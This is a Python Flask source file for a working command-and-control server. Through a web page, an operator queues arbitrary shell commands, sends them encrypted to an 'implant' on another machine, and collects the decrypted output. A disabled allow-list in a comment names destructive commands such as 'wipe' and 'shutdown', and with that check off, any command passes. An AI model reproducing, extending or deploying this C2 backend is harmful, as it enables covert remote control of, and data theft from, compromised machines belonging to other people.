from flask import Flask, request, jsonify
from fernet import encrypt, decrypt
import os
import uuid

app = Flask(__name__)

# --- STATE --- #
commandQ = []
tasks = {}
#allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute"]

# --- ENDPOINTS --- #
@app.route("/")
def home():
    return """
    <html>
    <head>
        <title>Remote C2 Runner</title>
    </head>
    <body>
        <h2>Queue a Command</h2>
        <input type="text" id="commandInput" placeholder="e.g. whoami" />
        <button onclick="addCommand()">Send Command</button>
        <pre id="addResult"></pre>

        <h2>Dispatch Next Command in Queue to the Implant</h2>
        <button onclick="fetchCommand()">Fetch & Issue Command</button>
        <pre id="fetchResult"></pre>

        <h2>Queued Commands</h2>
        <pre>{}</pre>

        <h2>Task History</h2>
        <pre>{}</pre>

        <script>
        function addCommand() {{
            const cmd = document.getElementById('commandInput').value;
            fetch('/add_command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{command: cmd}})
            }})
            .then(r => r.json())
            .then(data => {{
                document.getElementById('addResult').textContent = JSON.stringify(data, null, 2);
                document.getElementById('commandInput').value = '';
            }});
        }}

        function fetchCommand() {{
            fetch('/command')
                .then(r => r.json())
                .then(data => {{
                    document.getElementById('fetchResult').textContent = JSON.stringify(data, null, 2);
                }});
        }}
        </script>
    </body>
    </html>
    """.format(commandQ, tasks)
    

@app.route("/checkin", methods=["POST"])
def checkin():
    data = request.json
    print("[+] Check-in received:", data)
    return jsonify({"status": "ok"})

#takes the first command on the command queue and issues the task to the implant.
@app.route("/command", methods=["GET"])
def command():
    if not commandQ:
        return jsonify({"status": "No Commands Queued"})
    cmd = commandQ.pop(0)
    taskID = str(uuid.uuid4())[:8]
    tasks[taskID] = cmd
    print(f'[+] Issuing task {taskID}: {cmd}')
    #encrypt the command before sending it off.
    encrypted_cmd = encrypt(cmd)
    #print(f'debugging purposes: encrypted cmd: {encrypted_cmd}\n')
    return jsonify({"taskID": taskID, "command": encrypted_cmd})

#adds a command from the allowedCommands list to the queue. 
@app.route("/add_command", methods=["POST"])
def add_command():
    if request.is_json:
        data = request.json
        cmd = data.get("command")
    else:
        cmd = request.form.get("command")

    #if cmd not in allowedCommands:
        #return jsonify({"error": "command not allowed."}), 403
    commandQ.append(cmd)
    print(f'[+] Command added to queue: {cmd}')
    return jsonify({"status": "command added", "command": cmd})

@app.route("/result", methods=["POST"])
def result():
    data = request.json
    taskID = data.get("taskID")
    output = data.get("output")
    #decrypt the output received.
    try:
        output = decrypt(output)
        #print(f'debugging purposes: encrypted message received: {output}')
    except:
        pass
    cmd = tasks.get(taskID, "unknown")
    print(f"[+] Result received for {taskID} {cmd}: {output}")
    return jsonify({"status": "received"})

# --- RUN --- #
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)